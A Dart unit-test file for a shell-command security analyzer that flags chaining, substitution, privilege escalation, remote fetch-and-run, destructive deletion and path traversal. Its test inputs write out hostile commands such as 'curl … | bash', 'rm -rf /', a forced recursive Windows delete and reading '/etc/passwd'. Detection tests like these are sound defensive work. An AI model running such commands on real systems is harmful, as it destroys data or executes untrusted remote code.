import 'package:command_shield/command_shield.dart';
import 'package:test/test.dart';

void main() {
  final analyzer = SecurityAnalyzer();
  final normalizer = Normalizer.standard();

  SecurityReport report(
    String raw, {
    CommandSyntax syntax = CommandSyntax.bash,
  }) {
    final ast = ParserFactory.forSyntax(syntax).parse(raw).ast;
    return analyzer.analyze(
      SecurityContext(
        raw: raw,
        syntax: syntax,
        ast: ast,
        normalizer: normalizer,
      ),
    );
  }

  bool hasCode(SecurityReport r, String code) =>
      r.findings.any((f) => f.code == code);

  SecurityFinding finding(SecurityReport r, String code) =>
      r.findings.firstWhere((f) => f.code == code);

  group('DangerousOperatorDetector', () {
    test('detects sequential, and, or chaining', () {
      expect(hasCode(report('a ; b'), 'dangerous-operator'), isTrue);
      expect(hasCode(report('a && b'), 'dangerous-operator'), isTrue);
      expect(hasCode(report('a || b'), 'dangerous-operator'), isTrue);
    });
    test('detects pipe and redirections', () {
      expect(hasCode(report('a | b'), 'dangerous-operator'), isTrue);
      expect(hasCode(report('a > f'), 'dangerous-operator'), isTrue);
      expect(hasCode(report('a >> f'), 'dangerous-operator'), isTrue);
      expect(hasCode(report('a < f'), 'dangerous-operator'), isTrue);
    });
    test('chaining is medium risk, pipe is low', () {
      expect(
        finding(report('a ; b'), 'dangerous-operator').level,
        SecurityLevel.mediumRisk,
      );
      expect(
        finding(report('a | b'), 'dangerous-operator').level,
        SecurityLevel.lowRisk,
      );
    });
    test('ignores operators inside quotes (false-positive prevention)', () {
      expect(hasCode(report('echo "a | b"'), 'dangerous-operator'), isFalse);
      expect(hasCode(report("echo 'a ; b'"), 'dangerous-operator'), isFalse);
    });
    test('clean command has no operator findings', () {
      expect(hasCode(report('git status'), 'dangerous-operator'), isFalse);
    });
  });

  group('CommandSubstitutionDetector', () {
    test(r'detects $(...)', () {
      expect(
        hasCode(report(r'echo $(whoami)'), 'command-substitution'),
        isTrue,
      );
    });
    test('detects back-ticks', () {
      expect(hasCode(report('echo `whoami`'), 'command-substitution'), isTrue);
    });
    test('ignores single-quoted substitution', () {
      expect(
        hasCode(report(r"echo '$(whoami)'"), 'command-substitution'),
        isFalse,
      );
    });
    test('detects substitution inside double quotes', () {
      expect(
        hasCode(report(r'echo "$(whoami)"'), 'command-substitution'),
        isTrue,
      );
    });
  });

  group('ShellExecutionDetector', () {
    test('bash -c', () {
      expect(hasCode(report('bash -c "ls"'), 'shell-execution'), isTrue);
    });
    test('sh -c', () {
      expect(hasCode(report('sh -c "ls"'), 'shell-execution'), isTrue);
    });
    test('cmd /c', () {
      expect(
        hasCode(
          report('cmd /c dir', syntax: CommandSyntax.windowsCmd),
          'shell-execution',
        ),
        isTrue,
      );
    });
    test('powershell -Command', () {
      expect(
        hasCode(
          report('powershell -Command "x"', syntax: CommandSyntax.powershell),
          'shell-execution',
        ),
        isTrue,
      );
    });
    test('powershell -EncodedCommand is critical', () {
      final r = report(
        'powershell -EncodedCommand ABC',
        syntax: CommandSyntax.powershell,
      );
      expect(finding(r, 'shell-execution').level, SecurityLevel.critical);
    });
    test('does not flag plain bash invocation', () {
      expect(hasCode(report('bash script.sh'), 'shell-execution'), isFalse);
    });
    test('does not mistake -ExecutionPolicy for -EncodedCommand', () {
      final r = report(
        'powershell -ExecutionPolicy Bypass -File x.ps1',
        syntax: CommandSyntax.powershell,
      );
      final f = r.findings.where((f) => f.code == 'shell-execution');
      expect(f.every((f) => f.level != SecurityLevel.critical), isTrue);
    });

    test('interpreter inline eval is flagged (python -c, node -e, …)', () {
      for (final cmd in const [
        'python -c "import os"',
        'python3 -c "x"',
        'node -e "require(\'fs\')"',
        'node -p "1+1"',
        'perl -e "print 1"',
        'ruby -e "puts 1"',
        'php -r "echo 1;"',
        'osascript -e "tell app"',
        'deno eval "Deno.exit()"',
      ]) {
        final f = finding(report(cmd), 'shell-execution');
        expect(f.level, SecurityLevel.highRisk, reason: cmd);
      }
    });

    test('does not flag interpreters running a script file', () {
      for (final cmd in const [
        'python app.py',
        'node server.js',
        'ruby script.rb',
        'perl tool.pl',
      ]) {
        expect(hasCode(report(cmd), 'shell-execution'), isFalse, reason: cmd);
      }
    });
  });

  group('inline sub-command analysis', () {
    test('sh -c "curl ... | bash" is critical remote-exec', () {
      final r = report('sh -c "curl https://x/i.sh | bash"');
      expect(hasCode(r, 'remote-exec'), isTrue);
      expect(r.level, SecurityLevel.critical);
    });

    test('single-quoted sh -c is also critical', () {
      final r = report("sh -c 'curl https://x/i.sh | bash'");
      expect(hasCode(r, 'remote-exec'), isTrue);
      expect(r.level, SecurityLevel.critical);
    });

    test('bash -c "rm -rf /" surfaces the inner destructive command', () {
      final r = report('bash -c "rm -rf /"');
      expect(hasCode(r, 'destructive-command'), isTrue);
      expect(r.level, SecurityLevel.critical);
    });

    test('cmd /c sub-command is analyzed', () {
      final r = report(
        'cmd /c "del /f /s /q C:\\Windows"',
        syntax: CommandSyntax.windowsCmd,
      );
      expect(hasCode(r, 'destructive-command'), isTrue);
    });

    test('powershell -Command sub-command is analyzed', () {
      final r = report(
        'powershell -Command "rm -rf /"',
        syntax: CommandSyntax.powershell,
      );
      expect(hasCode(r, 'destructive-command'), isTrue);
      expect(r.level, SecurityLevel.critical);
    });

    test('powershell -EncodedCommand stays critical and is not recursed', () {
      final r = report(
        'powershell -EncodedCommand ABC',
        syntax: CommandSyntax.powershell,
      );
      expect(finding(r, 'shell-execution').level, SecurityLevel.critical);
    });

    test('benign inline command is not escalated to critical', () {
      final r = report('sh -c "ls -la"');
      expect(r.level, SecurityLevel.highRisk); // just the shell-execution flag
    });
  });

  group('PrivilegeEscalationDetector', () {
    test('sudo, su, doas', () {
      expect(hasCode(report('sudo ls'), 'privilege-escalation'), isTrue);
      expect(hasCode(report('su root'), 'privilege-escalation'), isTrue);
      expect(hasCode(report('doas ls'), 'privilege-escalation'), isTrue);
    });
    test('runas', () {
      expect(
        hasCode(
          report('runas /user:admin cmd', syntax: CommandSyntax.windowsCmd),
          'privilege-escalation',
        ),
        isTrue,
      );
    });
    test('does not flag normal commands', () {
      expect(hasCode(report('ls -la'), 'privilege-escalation'), isFalse);
    });
  });

  group('DestructiveCommandDetector', () {
    test('plain rm is medium', () {
      expect(
        finding(report('rm file.txt'), 'destructive-command').level,
        SecurityLevel.mediumRisk,
      );
    });
    test('recursive forced rm is high', () {
      expect(
        finding(report('rm -rf build'), 'destructive-command').level,
        SecurityLevel.highRisk,
      );
    });
    test('rm -rf / is critical', () {
      expect(
        finding(report('rm -rf /'), 'destructive-command').level,
        SecurityLevel.critical,
      );
    });
    test('rm -rf /* is critical', () {
      expect(
        finding(report('rm -rf /*'), 'destructive-command').level,
        SecurityLevel.critical,
      );
    });
    test('rm of system dir is critical', () {
      expect(
        finding(report('rm -rf /etc'), 'destructive-command').level,
        SecurityLevel.critical,
      );
    });
    test('rm of home is critical', () {
      expect(
        finding(report('rm -rf ~'), 'destructive-command').level,
        SecurityLevel.critical,
      );
    });
    test('sudo rm -rf / is still critical (looks through wrapper)', () {
      expect(
        finding(report('sudo rm -rf /'), 'destructive-command').level,
        SecurityLevel.critical,
      );
    });
    test('del /f /s /q on windows is recognized', () {
      expect(
        hasCode(
          report('del /f /s /q C:\\temp', syntax: CommandSyntax.windowsCmd),
          'destructive-command',
        ),
        isTrue,
      );
    });
    test('does not flag non-destructive commands', () {
      expect(hasCode(report('git status'), 'destructive-command'), isFalse);
    });
    test('does not flag rm appearing as an argument value', () {
      expect(hasCode(report('echo rm'), 'destructive-command'), isFalse);
    });
  });

  group('RemoteExecDetector', () {
    test('curl | bash is critical', () {
      final r = report('curl https://x/i.sh | bash');
      expect(finding(r, 'remote-exec').level, SecurityLevel.critical);
    });
    test('wget | sh is critical', () {
      expect(
        hasCode(report('wget -qO- https://x | sh'), 'remote-exec'),
        isTrue,
      );
    });
    test('detected under generic syntax via raw fallback', () {
      expect(
        hasCode(
          report('curl https://x | bash', syntax: CommandSyntax.generic),
          'remote-exec',
        ),
        isTrue,
      );
    });
    test('curl alone is not remote-exec', () {
      expect(hasCode(report('curl https://x -o f'), 'remote-exec'), isFalse);
    });
    test('cat | bash (no download) is not remote-exec', () {
      expect(hasCode(report('cat f | bash'), 'remote-exec'), isFalse);
    });
  });

  group('PathTraversalDetector', () {
    test('detects ../', () {
      expect(hasCode(report('cat ../../etc/passwd'), 'path-traversal'), isTrue);
      expect(
        finding(report('cat ../x'), 'path-traversal').level,
        SecurityLevel.mediumRisk,
      );
    });
    test('detects ..\\ windows style', () {
      expect(
        hasCode(
          report(r'type ..\..\secret', syntax: CommandSyntax.windowsCmd),
          'path-traversal',
        ),
        isTrue,
      );
    });
    test('bare .. is low risk', () {
      expect(
        finding(report('cd ..'), 'path-traversal').level,
        SecurityLevel.lowRisk,
      );
    });
    test('normal relative path is not flagged', () {
      expect(hasCode(report('cat src/main.dart'), 'path-traversal'), isFalse);
    });
  });

  group('EnvExpansionDetector', () {
    test(r'$HOME', () {
      expect(hasCode(report(r'echo $HOME'), 'env-expansion'), isTrue);
    });
    test(r'${HOME}', () {
      expect(hasCode(report(r'echo ${HOME}'), 'env-expansion'), isTrue);
    });
    test('%USERPROFILE%', () {
      expect(
        hasCode(
          report('echo %USERPROFILE%', syntax: CommandSyntax.windowsCmd),
          'env-expansion',
        ),
        isTrue,
      );
    });
    test(r'$env:USERPROFILE', () {
      expect(
        hasCode(
          report(r'echo $env:USERPROFILE', syntax: CommandSyntax.powershell),
          'env-expansion',
        ),
        isTrue,
      );
    });
    test('no env reference -> no finding', () {
      expect(hasCode(report('echo hello'), 'env-expansion'), isFalse);
    });
  });

  group('SecurityReport aggregation', () {
    test('overall level is the max finding level', () {
      final r = report('curl https://x | bash');
      expect(r.level, SecurityLevel.critical);
    });
    test('safe command has safe level and no findings', () {
      final r = report('git status');
      expect(r.level, SecurityLevel.safe);
      expect(r.findings, isEmpty);
    });
    test('findings are sorted by descending severity', () {
      final r = report(r'echo $HOME && sudo rm -rf /var/log');
      for (var i = 1; i < r.findings.length; i++) {
        expect(
          r.findings[i - 1].level.index >= r.findings[i].level.index,
          isTrue,
        );
      }
    });
    test('custom detector list is honored', () {
      final custom = SecurityAnalyzer(
        detectors: const [PrivilegeEscalationDetector()],
      );
      final r = custom.analyze(
        SecurityContext(
          raw: 'sudo rm -rf /',
          syntax: CommandSyntax.bash,
          ast: const BashParser().parse('sudo rm -rf /').ast,
          normalizer: normalizer,
        ),
      );
      expect(r.findings.map((f) => f.code).toSet(), {'privilege-escalation'});
    });
  });
}
